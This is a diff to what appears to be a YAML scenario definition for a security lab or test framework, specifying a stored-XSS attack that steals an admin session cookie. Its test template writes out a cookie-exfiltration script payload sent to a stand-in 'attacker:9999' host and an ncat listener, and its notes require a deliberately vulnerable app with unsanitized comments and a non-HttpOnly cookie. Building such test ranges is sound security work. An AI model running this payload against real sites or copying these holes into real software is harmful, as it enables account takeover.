@@ -1,45 +1,41 @@
 id: session_theft_via_xss
 description: >
   Steal an admin user's session cookie by injecting a stored XSS payload that
-  executes in the context of an admin bot's authenticated headless browser
-  session. The payload exfiltrates document.cookie to an attacker-controlled
-  HTTP listener via an image tag or fetch request. The stolen cookie can then
-  be used to access admin-only functionality.
+  executes in the context of an external browser sidecar (simulating an admin
+  visiting the page). The payload exfiltrates document.cookie to an
+  attacker-controlled HTTP listener via an image tag request. The stolen cookie
+  can then be used to access admin-only functionality.
 compatible_vuln_patterns:
+  - xss_stored
   - xss_admin_bot
 success_criteria:
   description: >
     The attacker starts an HTTP listener on port 9999, injects a stored XSS
-    payload containing a document.cookie exfiltration script, triggers the
-    admin bot to visit the page, and receives the admin's session cookie on
-    the listener. The captured data contains an identifiable session token.
+    payload, then the external browser sidecar visits the page (simulating the
+    admin). The XSS executes and sends the admin session cookie to the listener.
   output_pattern: 'admin_token=|session_id=|session=|connect\.sid='
 test_template: |
-  # Step 1: start listener to catch exfiltrated cookies
-  rm -f /tmp/exfil.txt
-  timeout 30 bash -c 'ncat -lnvp 9999 > /tmp/exfil.txt' &
-  LISTENER_PID=$!
-  sleep 2
-
-  # Step 2: inject XSS payload that exfiltrates cookies to our listener
-  curl -s -X POST "http://target:{{port}}/{{submit_endpoint}}" \
-    --data-urlencode "{{input_parameter}}=<script>new Image().src='http://attacker:9999/?c='+document.cookie</script>"
-
-  # Step 3: trigger the admin bot to visit the page
-  curl -s "http://target:{{port}}/{{trigger_endpoint}}"
-
-  # Step 4: wait for bot to execute JS and exfiltration to arrive
-  sleep 15
-
-  # Step 5: check captured data for admin session cookie
-  kill $LISTENER_PID 2>/dev/null
-  wait $LISTENER_PID 2>/dev/null
-  cat /tmp/exfil.txt | grep -iE 'admin_token|session_id|session|connect\.sid'
+  # Step 1: start listener
+  Step 1: Run in attacker: rm -f /tmp/exfil.txt && ncat -lnvp 9999 > /tmp/exfil.txt &
+  # Step 2: inject XSS payload
+  Step 2: Run in attacker: curl -s -X POST "http://target:{{port}}/comment" --data-urlencode "comment=<script>new Image().src='http://attacker:9999/?c='+document.cookie</script>"
+  # Step 3: browser visits as admin (sets cookie, then views comments where XSS fires)
+  Step 3: In browser: navigate to http://target:{{port}}/admin to get admin cookie, then navigate to http://target:{{port}}/ to trigger the stored XSS
+  # Step 4: collect exfiltrated cookie
+  Step 4: Run in attacker: sleep 10 && cat /tmp/exfil.txt
+  Success criterion: /tmp/exfil.txt contains admin_token= or session=
 notes: >
-  Requires Node.js and Puppeteer (with system Chromium) installed on the
-  target container — the admin bot runs there as a service component. The
-  deploy_snippet must install chromium-browser, nodejs, npm, and puppeteer.
-  The admin bot script must use --no-sandbox and
-  executablePath: /usr/bin/chromium-browser. The session cookie MUST NOT be
-  HttpOnly. Both containers share a Docker bridge network so the browser on
-  target resolves 'attacker' via Docker DNS.
+  CRITICAL: The app must NOT use Puppeteer or any browser inside the target
+  container. The external browser sidecar (goe-browser container) replaces the
+  admin bot pattern. The app only needs:
+    1. A POST endpoint to store comments (unsanitized XSS)
+    2. A GET endpoint to render stored comments (where XSS fires)
+    3. An /admin endpoint that sets a non-HttpOnly session cookie
+  The browser sidecar visits /admin (gets cookie), then visits / (XSS fires,
+  sends cookie to attacker listener). No Puppeteer, no chromium-browser, no
+  trigger-bot endpoint needed in the app.
+
+  The session cookie on /admin MUST be non-HttpOnly (httpOnly: false) so JS
+  can read document.cookie. The attacker listener runs ncat on port 9999.
+  Both containers share the Docker bridge network so 'attacker' hostname
+  resolves from the browser container.
